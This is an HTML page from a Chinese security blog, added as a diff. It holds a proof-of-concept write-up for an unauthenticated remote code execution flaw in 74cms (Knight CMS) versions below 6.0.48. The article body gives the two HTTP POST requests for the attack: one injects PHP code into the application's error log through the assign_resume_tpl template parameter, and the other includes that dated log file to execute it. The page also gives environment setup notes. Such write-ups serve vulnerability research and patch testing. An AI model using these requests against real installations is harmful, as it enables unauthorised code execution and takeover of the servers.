@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+<meta name="description" content="74cms v6.0.48模版注入+文件包含getshell0x01 简介骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。 0x02 漏洞概述骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="74cms v6.0.48模版注入+文件包含getshell">
+<meta property="og:url" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/index.html">
+<meta property="og:site_name" content="隐秘行动">
+<meta property="og:description" content="74cms v6.0.48模版注入+文件包含getshell0x01 简介骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。 0x02 漏洞概述骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png">
+<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png">
+<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png">
+<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png">
+<meta property="article:published_time" content="2021-01-12T03:56:11.000Z">
+<meta property="article:modified_time" content="2021-01-12T08:30:44.229Z">
+<meta property="article:author" content="nicaishui">
+<meta property="article:tag" content="74cms">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png">
+
+
+<link rel="canonical" href="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>74cms v6.0.48模版注入+文件包含getshell | 隐秘行动</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">隐秘行动</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li>
+        <li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#74cms-v6-0-48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="nav-number">1.</span> <span class="nav-text">74cms v6.0.48模版注入+文件包含getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nicaishui"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">nicaishui</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:jiade@gmail.com" title="E-Mail → mailto:jiade@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/jiade" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/jiade" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/jiade" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          74cms v6.0.48模版注入+文件包含getshell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:44" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <a id="more"></a>
+
+<h1 id="74cms-v6-0-48模版注入-文件包含getshell"><a href="#74cms-v6-0-48模版注入-文件包含getshell" class="headerlink" title="74cms v6.0.48模版注入+文件包含getshell"></a>74cms v6.0.48模版注入+文件包含getshell</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套<strong>免费 +</strong> 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。</p>
+<h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p>
+<h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p>
+<p><strong>0x04 环境搭建</strong></p>
+<p>骑士cms不支持php7.0，所以建议使用php5</p>
+<p>官网下载6.0.20版本</p>
+<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png" alt="image-20201214112017128"></p>
+<p>将源码放在web根目录下，访问/index.php进行安装</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.发送如下请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png" alt="img"></p>
+<p>查看日志会发现已经记录了错误<br>位置：\phpstudy_pro\WWW\data\Runtime\Logs\Home</p>
+<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png" alt="img"></p>
+<p>3.包含日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;20_12_12.log</span><br></pre></td></tr></table></figure>
+<p>日志名称就是当天的年月日，直接包含即可</p>
+<p><img src="resource/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png" alt="img"></p>
+<p>为什么不能使用get来请求，因为url在提交给后台处理会被进行url编码，从而造成包含不成功，因此要采取post方式发送payload</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/74cms/" rel="tag"># 74cms</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/12/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/" rel="prev" title="（CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞">
+                  <i class="fa fa-chevron-left"></i> （CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/12/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" rel="next" title="74cms v6.0.4 反射型xss">
+                  74cms v6.0.4 反射型xss <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nicaishui</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
